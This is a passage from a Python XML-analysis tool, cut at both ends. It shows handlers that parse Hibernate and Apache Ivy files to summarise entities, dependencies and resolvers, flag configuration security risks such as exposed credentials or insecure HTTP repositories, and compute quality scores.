                    prop_info['nullable_properties'] += 1
                
                if prop_detail['unique']:
                    prop_info['unique_properties'] += 1
        
        return prop_info
    
    def _analyze_collections(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze collection mappings"""
        collection_info = {
            'collection_count': 0,
            'collection_types': {
                'set': 0,
                'list': 0,
                'map': 0,
                'bag': 0,
                'array': 0
            },
            'collection_details': []
        }
        
        collection_elements = ['set', 'list', 'map', 'bag', 'array']
        
        for elem in root.iter():
            elem_name = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
            
            if elem_name in collection_elements:
                collection_detail = {
                    'type': elem_name,
                    'name': elem.get('name'),
                    'table': elem.get('table'),
                    'cascade': elem.get('cascade'),
                    'fetch': elem.get('fetch'),
                    'lazy': elem.get('lazy'),
                    'inverse': elem.get('inverse') == 'true'
                }
                
                collection_info['collection_details'].append(collection_detail)
                collection_info['collection_count'] += 1
                collection_info['collection_types'][elem_name] += 1
        
        return collection_info
    
    def _analyze_inheritance(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze inheritance mappings"""
        inheritance_info = {
            'has_inheritance': False,
            'strategies': [],
            'subclass_count': 0,
            'discriminator_present': False
        }
        
        # Check for inheritance elements
        inheritance_elements = ['subclass', 'joined-subclass', 'union-subclass']
        
        for elem in root.iter():
            elem_name = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
            
            if elem_name in inheritance_elements:
                inheritance_info['has_inheritance'] = True
                inheritance_info['subclass_count'] += 1
                if elem_name not in inheritance_info['strategies']:
                    inheritance_info['strategies'].append(elem_name)
            
            elif elem_name == 'discriminator':
                inheritance_info['discriminator_present'] = True
        
        return inheritance_info
    
    def _analyze_sql_queries(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze SQL queries and HQL"""
        query_info = {
            'sql_query_count': 0,
            'hql_query_count': 0,
            'named_queries': [],
            'query_details': []
        }
        
        for elem in root.iter():
            elem_name = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
            
            if elem_name == 'sql-query':
                query_detail = {
                    'type': 'sql',
                    'name': elem.get('name'),
                    'query_text': elem.text
                }
                query_info['query_details'].append(query_detail)
                query_info['sql_query_count'] += 1
                if query_detail['name']:
                    query_info['named_queries'].append(query_detail['name'])
            
            elif elem_name == 'query':
                query_detail = {
                    'type': 'hql',
                    'name': elem.get('name'),
                    'query_text': elem.text
                }
                query_info['query_details'].append(query_detail)
                query_info['hql_query_count'] += 1
                if query_detail['name']:
                    query_info['named_queries'].append(query_detail['name'])
        
        return query_info
    
    def _analyze_configuration_security(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze security aspects of configuration"""
        security_info = {
            'security_risks': [],
            'credentials_exposed': False,
            'sql_logging_enabled': False,
            'connection_validation': False
        }
        
        db_info = self._extract_database_info(root)
        
        # Check for exposed credentials
        if db_info.get('username') or any('password' in prop.get('name', '') 
                                         for elem in root.iter() 
                                         for prop in [elem] 
                                         if elem.tag.split('}')[-1] == 'property'):
            security_info['credentials_exposed'] = True
            security_info['security_risks'].append('Database credentials visible in configuration')
        
        # Check for SQL logging
        if db_info.get('show_sql'):
            security_info['sql_logging_enabled'] = True
            security_info['security_risks'].append('SQL logging enabled - may expose sensitive data')
        
        # Check for connection validation
        for elem in root.iter():
            if (elem.tag.split('}')[-1] == 'property' and 
                elem.get('name') and 'validation' in elem.get('name')):
                security_info['connection_validation'] = True
                break
        
        if not security_info['connection_validation']:
            security_info['security_risks'].append('No connection validation configured')
        
        return security_info
    
    def _analyze_mapping_security(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze security aspects of mapping"""
        security_info = {
            'security_risks': [],
            'native_sql_queries': 0,
            'dynamic_insert_update': False
        }
        
        # Count native SQL queries (potential injection risk)
        for elem in root.iter():
            elem_name = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
            if elem_name == 'sql-query':
                security_info['native_sql_queries'] += 1
        
        if security_info['native_sql_queries'] > 0:
            security_info['security_risks'].append(f'{security_info["native_sql_queries"]} native SQL queries found - review for injection risks')
        
        # Check for dynamic insert/update
        for elem in root.iter():
            if (elem.tag.split('}')[-1] in ['class', 'subclass'] and
                (elem.get('dynamic-insert') == 'true' or elem.get('dynamic-update') == 'true')):
                security_info['dynamic_insert_update'] = True
                break
        
        return security_info
    
    def _analyze_performance_settings(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze performance-related settings"""
        perf_info = {
            'batch_size': None,
            'fetch_size': None,
            'cache_settings': [],
            'lazy_loading': False,
            'connection_pool_configured': False
        }
        
        for elem in root.iter():
            if elem.tag.split('}')[-1] == 'property' and elem.get('name'):
                prop_name = elem.get('name')
                prop_value = elem.text
                
                if 'batch_size' in prop_name:
                    perf_info['batch_size'] = prop_value
                elif 'fetch_size' in prop_name:
                    perf_info['fetch_size'] = prop_value
                elif 'cache' in prop_name:
                    perf_info['cache_settings'].append({
                        'property': prop_name,
                        'value': prop_value
                    })
                elif 'pool' in prop_name:
                    perf_info['connection_pool_configured'] = True
        
        return perf_info
    
    def _categorize_property(self, prop_name: str) -> str:
        """Categorize a Hibernate property"""
        if 'connection' in prop_name:
            return 'connection'
        elif 'dialect' in prop_name:
            return 'dialect'
        elif 'cache' in prop_name:
            return 'cache'
        elif 'transaction' in prop_name:
            return 'transaction'
        else:
            return 'other'
    
    def _detect_hibernate_version(self, root: ET.Element) -> str:
        """Detect Hibernate version from DTD or other indicators"""
        # This is a simplified version - in practice, you'd check DOCTYPE
        return "5.x"  # Default assumption
    
    def _determine_file_type(self, root: ET.Element) -> str:
        """Determine if this is a configuration or mapping file"""
        root_tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        
        if root_tag == 'hibernate-configuration':
            return 'Configuration'
        elif root_tag == 'hibernate-mapping':
            return 'Mapping'
        else:
            return 'Configuration'  # Default
    
    def _count_entities(self, root: ET.Element) -> int:
        """Count number of entities in the file"""
        entity_elements = ['class', 'subclass', 'joined-subclass', 'union-subclass']
        count = 0
        
        for elem in root.iter():
            elem_name = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
            if elem_name in entity_elements:
                count += 1
        
        return count
    
    def _extract_database_summary(self, root: ET.Element) -> Dict[str, Any]:
        """Extract database connection summary"""
        db_info = self._extract_database_info(root)
        return {
            'driver': db_info.get('driver'),
            'database_type': self._infer_database_type(db_info.get('driver', '')),
            'has_connection_pool': db_info.get('has_connection_pool', False),
            'show_sql': db_info.get('show_sql', False)
        }
    
    def _extract_entity_summary(self, root: ET.Element) -> Dict[str, Any]:
        """Extract entity summary information"""
        entities = self._analyze_entities(root)
        return {
            'entity_count': entities['entity_count'],
            'table_names': entities['table_names'][:10],  # Limit to first 10
            'has_inheritance': len(entities['inheritance_strategies']) > 0
        }
    
    def _extract_configuration_summary(self, root: ET.Element) -> Dict[str, Any]:
        """Extract configuration summary"""
        if self._find_element_by_local_name(root, 'session-factory') is not None:
            session_factory = self._analyze_session_factory(root)
            return {
                'session_factory_configured': session_factory['present'],
                'property_count': session_factory['property_count'],
                'mapping_count': session_factory['mapping_count']
            }
        else:
            return {
                'session_factory_configured': False,
                'property_count': 0,
                'mapping_count': 0
            }
    
    def _infer_database_type(self, driver: str) -> str:
        """Infer database type from driver class"""
        if not driver:
            return 'Unknown'
        
        driver_lower = driver.lower()
        if 'mysql' in driver_lower:
            return 'MySQL'
        elif 'postgresql' in driver_lower or 'postgres' in driver_lower:
            return 'PostgreSQL'
        elif 'oracle' in driver_lower:
            return 'Oracle'
        elif 'sqlserver' in driver_lower or 'mssql' in driver_lower:
            return 'SQL Server'
        elif 'h2' in driver_lower:
            return 'H2'
        elif 'hsql' in driver_lower:
            return 'HSQLDB'
        elif 'derby' in driver_lower:
            return 'Derby'
        else:
            return 'Unknown'
    
    def _analyze_hibernate_elements(self, root: ET.Element) -> Dict[str, Any]:
        """Generic analysis of Hibernate elements"""
        return {
            'file_type': self._determine_file_type(root),
            'version': self._detect_hibernate_version(root),
            'element_count': len(list(root.iter()))
        }
    
    def _analyze_security(self, root: ET.Element) -> Dict[str, Any]:
        """Generic security analysis"""
        root_tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        
        if root_tag == 'hibernate-configuration':
            return self._analyze_configuration_security(root)
        else:
            return self._analyze_mapping_security(root)
    
    def _find_element_by_local_name(self, parent: ET.Element, local_name: str) -> Optional[ET.Element]:
        """Find element by local name, ignoring namespace"""
        for elem in parent:
            elem_local_name = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
            if elem_local_name == local_name:
                return elem
        return None
    
    def _assess_hibernate_quality(self, findings: Dict[str, Any]) -> Dict[str, float]:
        """Assess Hibernate configuration quality"""
        
        # Security quality
        security_score = 1.0
        if 'security' in findings and findings['security']['security_risks']:
            risk_count = len(findings['security']['security_risks'])
            security_score = max(0.0, 1.0 - (risk_count * 0.2))
        
        # Configuration quality
        config_score = 0.0
        if 'session_factory' in findings and findings['session_factory']['present']:
            config_score += 0.4
        if 'database_info' in findings and findings['database_info']['driver']:
            config_score += 0.3
        if 'properties' in findings and findings['properties']['property_count'] > 0:
            config_score += 0.3
        
        # Mapping quality
        mapping_score = 0.0
        if 'entities' in findings:
            if findings['entities']['entity_count'] > 0:
                mapping_score += 0.5
            if all(entity['id_present'] for entity in findings['entities']['entity_details']):
                mapping_score += 0.3
            if findings['entities']['entity_count'] > 0:
                mapping_score += 0.2
        else:
            mapping_score = 0.8  # Configuration files don't need mapping quality
        
        # Performance quality
        performance_score = 0.5  # Base score
        if 'performance' in findings:
            if findings['performance']['connection_pool_configured']:
                performance_score += 0.2
            if findings['performance']['batch_size']:
                performance_score += 0.2
            if findings['performance']['cache_settings']:
                performance_score += 0.1
        
        performance_score = min(performance_score, 1.0)
        
        return {
            "security": security_score,
            "configuration": config_score,
            "mapping": mapping_score,
            "performance": performance_score,
            "overall": (security_score + config_score + mapping_score + performance_score) / 4
        }
</file>

<file path="src/handlers/ivy_handler.py">
#!/usr/bin/env python3
"""
Ivy Handler

Analyzes Apache Ivy dependency management files for dependency analysis,
security scanning, license compliance, and build optimization.
"""

import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Any, Tuple
import re
import sys
import os

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.analyzer import XMLHandler, DocumentTypeInfo, SpecializedAnalysis


class IvyHandler(XMLHandler):
    """Handler for Apache Ivy dependency management files"""
    
    def can_handle(self, root: ET.Element, namespaces: Dict[str, str]) -> Tuple[bool, float]:
        # Check for Ivy root elements
        root_tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        
        # Primary Ivy file types
        if root_tag == 'ivy-module':
            confidence = 0.8
            
            # Check for required attributes
            if root.get('version'):
                confidence += 0.1
            
            # Check for info element
            if self._find_element_by_local_name(root, 'info') is not None:
                confidence += 0.1
            
            return True, confidence
        
        # Ivy settings files
        elif root_tag == 'ivysettings':
            confidence = 0.9
            return True, confidence
        
        # Check for Ivy-specific patterns in any XML
        ivy_indicators = ['ivy-module', 'dependencies', 'dependency', 'publications', 'artifact']
        indicator_count = sum(1 for indicator in ivy_indicators 
                            if any(indicator in elem.tag for elem in root.iter()))
        
        if indicator_count >= 3:  # Multiple Ivy indicators
            return True, min(0.6 + (indicator_count * 0.1), 1.0)
        
        # Check for Ivy namespace or attributes
        if any('ivy' in str(value).lower() for value in namespaces.values()):
            return True, 0.7
        
        return False, 0.0
    
    def detect_type(self, root: ET.Element, namespaces: Dict[str, str]) -> DocumentTypeInfo:
        root_tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        
        # Determine file type
        if root_tag == 'ivy-module':
            file_type = "Module Descriptor"
            category = "ivy_module"
        elif root_tag == 'ivysettings':
            file_type = "Settings"
            category = "ivy_settings"
        else:
            file_type = "Module Descriptor"  # Default
            category = "ivy_unknown"
        
        # Extract module information
        module_info = self._extract_module_info(root)
        
        metadata = {
            "tool": "Apache Ivy",
            "category": category,
            "file_type": file_type,
            "module_organization": module_info.get('organisation'),
            "module_name": module_info.get('module'),
            "module_revision": module_info.get('revision'),
            "dependency_count": self._count_dependencies(root),
            "publication_count": self._count_publications(root)
        }
        
        return DocumentTypeInfo(
            type_name=f"Ivy {file_type}",
            confidence=0.95,
            version=root.get('version', '2.0'),
            metadata=metadata
        )
    
    def analyze(self, root: ET.Element, file_path: str) -> SpecializedAnalysis:
        root_tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        
        if root_tag == 'ivy-module':
            findings = self._analyze_module(root)
        elif root_tag == 'ivysettings':
            findings = self._analyze_settings(root)
        else:
            # Generic analysis
            findings = {
                'ivy_info': self._analyze_ivy_elements(root),
                'dependencies': self._analyze_dependencies(root),
                'publications': self._analyze_publications(root),
                'security': self._analyze_security(root)
            }
        
        recommendations = [
            "Review dependency versions for known security vulnerabilities",
            "Analyze transitive dependencies for license compliance",
            "Check for deprecated or unmaintained dependencies",
            "Validate repository URLs and accessibility",
            "Review artifact publication settings for security",
            "Analyze dependency conflicts and version ranges",
            "Check for circular dependency issues",
            "Validate module metadata and descriptions"
        ]
        
        ai_use_cases = [
            "Dependency vulnerability scanning and analysis",
            "License compliance auditing and reporting",
            "Build optimization and dependency management",
            "Security assessment of third-party libraries",
            "Dependency graph analysis and visualization",
            "Version conflict resolution and management",
            "Repository and artifact analysis",
            "Supply chain security monitoring",
            "Automated dependency updates and maintenance"
        ]
        
        # Calculate data inventory
        data_inventory = {}
        if 'dependencies' in findings:
            data_inventory['dependencies'] = len(findings['dependencies']['dependency_details'])
        if 'publications' in findings:
            data_inventory['publications'] = len(findings['publications']['publication_details'])
        if 'configurations' in findings:
            data_inventory['configurations'] = len(findings['configurations']['configuration_details'])
        
        return SpecializedAnalysis(
            document_type=f"Ivy {findings.get('ivy_info', {}).get('file_type', 'Module')}",
            key_findings=findings,
            recommendations=recommendations,
            data_inventory=data_inventory,
            ai_use_cases=ai_use_cases,
            structured_data=self.extract_key_data(root),
            quality_metrics=self._assess_ivy_quality(findings)
        )
    
    def extract_key_data(self, root: ET.Element) -> Dict[str, Any]:
        return {
            'module_metadata': {
                'version': root.get('version', '2.0'),
                'file_type': self._determine_file_type(root),
                'module_info': self._extract_module_info(root)
            },
            'dependency_summary': self._extract_dependency_summary(root),
            'publication_summary': self._extract_publication_summary(root),
            'configuration_summary': self._extract_configuration_summary(root)
        }
    
    def _analyze_module(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze Ivy module descriptor"""
        findings = {
            'ivy_info': {
                'file_type': 'Module Descriptor',
                'version': root.get('version', '2.0')
            },
            'module_info': self._analyze_module_info(root),
            'configurations': self._analyze_configurations(root),
            'publications': self._analyze_publications(root),
            'dependencies': self._analyze_dependencies(root),
            'conflicts': self._analyze_conflicts(root),
            'security': self._analyze_module_security(root),
            'repositories': self._analyze_repositories(root)
        }
        return findings
    
    def _analyze_settings(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze Ivy settings file"""
        findings = {
            'ivy_info': {
                'file_type': 'Settings',
                'version': root.get('version', '2.0')
            },
            'settings': self._analyze_ivy_settings(root),
            'resolvers': self._analyze_resolvers(root),
            'modules': self._analyze_module_settings(root),
            'security': self._analyze_settings_security(root)
        }
        return findings
    
    def _extract_module_info(self, root: ET.Element) -> Dict[str, Any]:
        """Extract basic module information"""
        info = self._find_element_by_local_name(root, 'info')
        if info is not None:
            return {
                'organisation': info.get('organisation'),
                'module': info.get('module'),
                'revision': info.get('revision'),
                'status': info.get('status'),
                'publication': info.get('publication'),
                'description': self._get_element_text(self._find_element_by_local_name(info, 'description'))
            }
        return {}
    
    def _analyze_module_info(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze module information section"""
        module_info = {
            'has_info': False,
            'organisation': None,
            'module': None,
            'revision': None,
            'status': None,
            'publication_date': None,
            'description': None,
            'license': None,
            'homepage': None,
            'authors': []
        }
        
        info = self._find_element_by_local_name(root, 'info')
        if info is not None:
            module_info['has_info'] = True
            module_info['organisation'] = info.get('organisation')
            module_info['module'] = info.get('module')
            module_info['revision'] = info.get('revision')
            module_info['status'] = info.get('status')
            module_info['publication_date'] = info.get('publication')
            
            # Extract description
            desc = self._find_element_by_local_name(info, 'description')
            if desc is not None:
                module_info['description'] = desc.text
            
            # Extract license
            license_elem = self._find_element_by_local_name(info, 'license')
            if license_elem is not None:
                module_info['license'] = {
                    'name': license_elem.get('name'),
                    'url': license_elem.get('url')
                }
            
            # Extract homepage
            homepage = self._find_element_by_local_name(info, 'ivyauthor')
            if homepage is not None:
                module_info['homepage'] = homepage.get('url')
            
            # Extract authors
            for author in info.iter():
                if author.tag.split('}')[-1] == 'ivyauthor':
                    author_info = {
                        'name': author.get('name'),
                        'url': author.get('url')
                    }
                    module_info['authors'].append(author_info)
        
        return module_info
    
    def _analyze_configurations(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze configuration definitions"""
        config_info = {
            'configuration_count': 0,
            'configuration_details': [],
            'default_configuration': None,
            'extends_relationships': []
        }
        
        configurations = self._find_element_by_local_name(root, 'configurations')
        if configurations is not None:
            config_info['default_configuration'] = configurations.get('defaultconfmapping')
            
            for conf in configurations.iter():
                if conf.tag.split('}')[-1] == 'conf':
                    conf_detail = {
                        'name': conf.get('name'),
                        'description': conf.get('description'),
                        'visibility': conf.get('visibility', 'public'),
                        'extends': conf.get('extends'),
                        'deprecated': conf.get('deprecated')
                    }
                    
                    config_info['configuration_details'].append(conf_detail)
                    config_info['configuration_count'] += 1
                    
                    if conf_detail['extends']:
                        config_info['extends_relationships'].append({
                            'child': conf_detail['name'],
                            'parent': conf_detail['extends']
                        })
        
        return config_info
    
    def _analyze_publications(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze publication artifacts"""
        pub_info = {
            'publication_count': 0,
            'publication_details': [],
            'artifact_types': {},
            'configurations_published': []
        }
        
        publications = self._find_element_by_local_name(root, 'publications')
        if publications is not None:
            for artifact in publications.iter():
                if artifact.tag.split('}')[-1] == 'artifact':
                    artifact_detail = {
                        'name': artifact.get('name'),
                        'type': artifact.get('type', 'jar'),
                        'ext': artifact.get('ext'),
                        'conf': artifact.get('conf'),
                        'url': artifact.get('url'),
                        'classifier': artifact.get('classifier')
                    }
                    
                    pub_info['publication_details'].append(artifact_detail)
                    pub_info['publication_count'] += 1
                    
                    # Count artifact types
                    artifact_type = artifact_detail['type']
                    pub_info['artifact_types'][artifact_type] = \
                        pub_info['artifact_types'].get(artifact_type, 0) + 1
                    
                    # Track configurations
                    if artifact_detail['conf']:
                        configs = artifact_detail['conf'].split(',')
                        pub_info['configurations_published'].extend(configs)
        
        # Remove duplicates from configurations
        pub_info['configurations_published'] = list(set(pub_info['configurations_published']))
        
        return pub_info
    
    def _analyze_dependencies(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze dependency declarations"""
        dep_info = {
            'dependency_count': 0,
            'dependency_details': [],
            'organizations': [],
            'version_patterns': {
                'fixed': 0,
                'ranges': 0,
                'dynamic': 0,
                'latest': 0
            },
            'transitive_disabled': 0,
            'optional_dependencies': 0
        }
        
        dependencies = self._find_element_by_local_name(root, 'dependencies')
        if dependencies is not None:
            for dep in dependencies.iter():
                if dep.tag.split('}')[-1] == 'dependency':
                    dep_detail = {
                        'org': dep.get('org'),
                        'name': dep.get('name'),
                        'rev': dep.get('rev'),
                        'conf': dep.get('conf'),
                        'transitive': dep.get('transitive', 'true') == 'true',
                        'changing': dep.get('changing', 'false') == 'true',
                        'force': dep.get('force', 'false') == 'true',
                        'branch': dep.get('branch'),
                        'artifacts': [],
                        'excludes': []
                    }
                    
                    # Analyze version pattern
                    version = dep_detail['rev']
                    if version:
                        if '+' in version or 'latest' in version.lower():
                            if 'latest' in version.lower():
                                dep_info['version_patterns']['latest'] += 1
                            else:
                                dep_info['version_patterns']['dynamic'] += 1
                        elif '[' in version or '(' in version:
                            dep_info['version_patterns']['ranges'] += 1
                        else:
                            dep_info['version_patterns']['fixed'] += 1
                    
                    # Count transitive and optional
                    if not dep_detail['transitive']:
                        dep_info['transitive_disabled'] += 1
                    
                    # Extract artifacts
                    for artifact in dep:
                        if artifact.tag.split('}')[-1] == 'artifact':
                            artifact_info = {
                                'name': artifact.get('name'),
                                'type': artifact.get('type'),
                                'ext': artifact.get('ext'),
                                'conf': artifact.get('conf')
                            }
                            dep_detail['artifacts'].append(artifact_info)
                    
                    # Extract excludes
                    for exclude in dep:
                        if exclude.tag.split('}')[-1] == 'exclude':
                            exclude_info = {
                                'org': exclude.get('org'),
                                'module': exclude.get('module'),
                                'name': exclude.get('name'),
                                'type': exclude.get('type'),
                                'ext': exclude.get('ext'),
                                'conf': exclude.get('conf')
                            }
                            dep_detail['excludes'].append(exclude_info)
                    
                    dep_info['dependency_details'].append(dep_detail)
                    dep_info['dependency_count'] += 1
                    
                    # Track organizations
                    if dep_detail['org'] and dep_detail['org'] not in dep_info['organizations']:
                        dep_info['organizations'].append(dep_detail['org'])
        
        return dep_info
    
    def _analyze_conflicts(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze conflict resolution settings"""
        conflict_info = {
            'conflict_managers': [],
            'default_conflict_manager': None
        }
        
        # Look for conflict managers in dependencies
        dependencies = self._find_element_by_local_name(root, 'dependencies')
        if dependencies is not None:
            conflict_info['default_conflict_manager'] = dependencies.get('defaultconfmapping')
            
            for manager in dependencies.iter():
                if manager.tag.split('}')[-1] == 'conflict':
                    manager_info = {
                        'org': manager.get('org'),
                        'module': manager.get('module'),
                        'manager': manager.get('manager'),
                        'rev': manager.get('rev')
                    }
                    conflict_info['conflict_managers'].append(manager_info)
        
        return conflict_info
    
    def _analyze_repositories(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze repository information (limited in module files)"""
        repo_info = {
            'repository_count': 0,
            'repository_urls': []
        }
        
        # In module files, repository info is usually minimal
        # Most repository configuration is in settings files
        for elem in root.iter():
            if 'url' in elem.attrib:
                url = elem.get('url')
                if url and url.startswith('http'):
                    repo_info['repository_urls'].append(url)
                    repo_info['repository_count'] += 1
        
        return repo_info
    
    def _analyze_module_security(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze security aspects of module"""
        security_info = {
            'security_risks': [],
            'dynamic_versions': 0,
            'external_repositories': 0,
            'transitive_enabled_count': 0,
            'changing_dependencies': 0
        }
        
        # Analyze dependencies for security risks
        dep_analysis = self._analyze_dependencies(root)
        
        # Count dynamic versions (security risk)
        security_info['dynamic_versions'] = (
            dep_analysis['version_patterns']['dynamic'] + 
            dep_analysis['version_patterns']['latest']
        )
        
        if security_info['dynamic_versions'] > 0:
            security_info['security_risks'].append(
                f'{security_info["dynamic_versions"]} dependencies use dynamic versions'
            )
        
        # Count changing dependencies
        security_info['changing_dependencies'] = sum(
            1 for dep in dep_analysis['dependency_details'] if dep.get('changing', False)
        )
        
        if security_info['changing_dependencies'] > 0:
            security_info['security_risks'].append(
                f'{security_info["changing_dependencies"]} dependencies marked as changing'
            )
        
        # Count transitive dependencies
        security_info['transitive_enabled_count'] = sum(
            1 for dep in dep_analysis['dependency_details'] if dep.get('transitive', True)
        )
        
        # Check for external URLs
        repo_analysis = self._analyze_repositories(root)
        security_info['external_repositories'] = len([
            url for url in repo_analysis['repository_urls'] 
            if not any(safe in url for safe in ['localhost', '127.0.0.1', 'internal'])
        ])
        
        if security_info['external_repositories'] > 0:
            security_info['security_risks'].append(
                f'{security_info["external_repositories"]} external repository URLs found'
            )
        
        return security_info
    
    def _analyze_ivy_settings(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze Ivy settings configuration"""
        settings_info = {
            'default_resolver': None,
            'default_conflict_manager': None,
            'validate': None,
            'check_exact_revision': None,
            'override_publish_dir': None
        }
        
        # Extract settings attributes
        settings_info['default_resolver'] = root.get('defaultResolver')
        settings_info['default_conflict_manager'] = root.get('defaultConflictManager')
        settings_info['validate'] = root.get('validate')
        settings_info['check_exact_revision'] = root.get('checkExactRevision')
        
        return settings_info
    
    def _analyze_resolvers(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze resolver configurations"""
        resolver_info = {
            'resolver_count': 0,
            'resolver_details': [],
            'resolver_types': {}
        }
        
        resolvers = self._find_element_by_local_name(root, 'resolvers')
        if resolvers is not None:
            for resolver in resolvers:
                resolver_name = resolver.tag.split('}')[-1]
                if resolver_name != 'resolvers':  # Skip the parent element
                    resolver_detail = {
                        'type': resolver_name,
                        'name': resolver.get('name'),
                        'url': resolver.get('url'),
                        'pattern': resolver.get('pattern'),
                        'checkmodified': resolver.get('checkmodified'),
                        'changingPattern': resolver.get('changingPattern')
                    }
                    
                    resolver_info['resolver_details'].append(resolver_detail)
                    resolver_info['resolver_count'] += 1
                    
                    # Count resolver types
                    resolver_info['resolver_types'][resolver_name] = \
                        resolver_info['resolver_types'].get(resolver_name, 0) + 1
        
        return resolver_info
    
    def _analyze_module_settings(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze module-specific settings"""
        module_settings = {
            'module_count': 0,
            'module_patterns': []
        }
        
        modules = self._find_element_by_local_name(root, 'modules')
        if modules is not None:
            for module in modules:
                if module.tag.split('}')[-1] == 'module':
                    pattern_info = {
                        'organisation': module.get('organisation'),
                        'name': module.get('name'),
                        'resolver': module.get('resolver'),
                        'conflict_manager': module.get('conflict-manager')
                    }
                    module_settings['module_patterns'].append(pattern_info)
                    module_settings['module_count'] += 1
        
        return module_settings
    
    def _analyze_settings_security(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze security aspects of settings"""
        security_info = {
            'security_risks': [],
            'http_repositories': 0,
            'validation_disabled': False
        }
        
        # Check validation settings
        if root.get('validate') == 'false':
            security_info['validation_disabled'] = True
            security_info['security_risks'].append('Ivy validation is disabled')
        
        # Check for HTTP repositories (vs HTTPS)
        resolver_analysis = self._analyze_resolvers(root)
        for resolver in resolver_analysis['resolver_details']:
            url = resolver.get('url')
            if url and url.startswith('http://'):
                security_info['http_repositories'] += 1
        
        if security_info['http_repositories'] > 0:
            security_info['security_risks'].append(
                f'{security_info["http_repositories"]} resolvers use insecure HTTP'
            )
        
        return security_info
    
    def _count_dependencies(self, root: ET.Element) -> int:
        """Count number of dependencies"""
        count = 0
        for elem in root.iter():
            if elem.tag.split('}')[-1] == 'dependency':
                count += 1
        return count
    
    def _count_publications(self, root: ET.Element) -> int:
        """Count number of publications"""
        count = 0
        for elem in root.iter():
            if elem.tag.split('}')[-1] == 'artifact':
                count += 1
        return count
    
    def _determine_file_type(self, root: ET.Element) -> str:
        """Determine if this is a module or settings file"""
        root_tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        
        if root_tag == 'ivy-module':
            return 'Module Descriptor'
        elif root_tag == 'ivysettings':
            return 'Settings'
        else:
            return 'Module Descriptor'  # Default
    
    def _extract_dependency_summary(self, root: ET.Element) -> Dict[str, Any]:
        """Extract dependency summary information"""
        dep_analysis = self._analyze_dependencies(root)
        return {
            'dependency_count': dep_analysis['dependency_count'],
            'organizations': dep_analysis['organizations'][:10],  # Limit to first 10
            'version_patterns': dep_analysis['version_patterns'],
            'transitive_disabled': dep_analysis['transitive_disabled']
        }
    
    def _extract_publication_summary(self, root: ET.Element) -> Dict[str, Any]:
        """Extract publication summary information"""
        pub_analysis = self._analyze_publications(root)
        return {
            'publication_count': pub_analysis['publication_count'],
            'artifact_types': pub_analysis['artifact_types'],
            'configurations_published': pub_analysis['configurations_published'][:5]  # Limit to first 5
        }
    
    def _extract_configuration_summary(self, root: ET.Element) -> Dict[str, Any]:
        """Extract configuration summary"""
        config_analysis = self._analyze_configurations(root)
        return {
            'configuration_count': config_analysis['configuration_count'],
            'default_configuration': config_analysis['default_configuration'],
            'extends_relationships': len(config_analysis['extends_relationships'])
        }
    
    def _analyze_ivy_elements(self, root: ET.Element) -> Dict[str, Any]:
        """Generic analysis of Ivy elements"""
        return {
            'file_type': self._determine_file_type(root),
            'version': root.get('version', '2.0'),
            'element_count': len(list(root.iter()))
        }
    
    def _analyze_security(self, root: ET.Element) -> Dict[str, Any]:
        """Generic security analysis"""
        root_tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        
        if root_tag == 'ivy-module':
            return self._analyze_module_security(root)
        else:
            return self._analyze_settings_security(root)
    
    def _find_element_by_local_name(self, parent: ET.Element, local_name: str) -> Optional[ET.Element]:
        """Find element by local name, ignoring namespace"""
        for elem in parent:
            elem_local_name = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
            if elem_local_name == local_name:
                return elem
        return None
    
    def _get_element_text(self, element: Optional[ET.Element]) -> Optional[str]:
        """Safely get text from element"""
        return element.text if element is not None else None
    
    def _assess_ivy_quality(self, findings: Dict[str, Any]) -> Dict[str, float]:
        """Assess Ivy configuration quality"""
        
        # Security quality
        security_score = 1.0
        if 'security' in findings and findings['security']['security_risks']:
            risk_count = len(findings['security']['security_risks'])
            security_score = max(0.0, 1.0 - (risk_count * 0.15))
        
        # Dependency management quality
        dependency_score = 0.0
        if 'dependencies' in findings:
            deps = findings['dependencies']
            if deps['dependency_count'] > 0:
                dependency_score += 0.4
                
                # Prefer fixed versions over dynamic
                total_deps = deps['dependency_count']
                fixed_ratio = deps['version_patterns']['fixed'] / total_deps if total_deps > 0 else 0
                dependency_score += fixed_ratio * 0.3
                
                # Bonus for having excludes (shows dependency management)
                if any(dep['excludes'] for dep in deps['dependency_details']):
                    dependency_score += 0.1
                
                # Bonus for organization diversity
                if len(deps['organizations']) > 1:
                    dependency_score += 0.2
        else:
            dependency_score = 0.8  # Settings files don't need dependency quality
        
        # Configuration quality
        config_score = 0.0
        if 'module_info' in findings and findings['module_info']['has_info']:
            module_info = findings['module_info']
            if module_info['organisation'] and module_info['module']:
                config_score += 0.4
            if module_info['revision']:
                config_score += 0.2
            if module_info['description']:
                config_score += 0.2
            if module_info['license']:
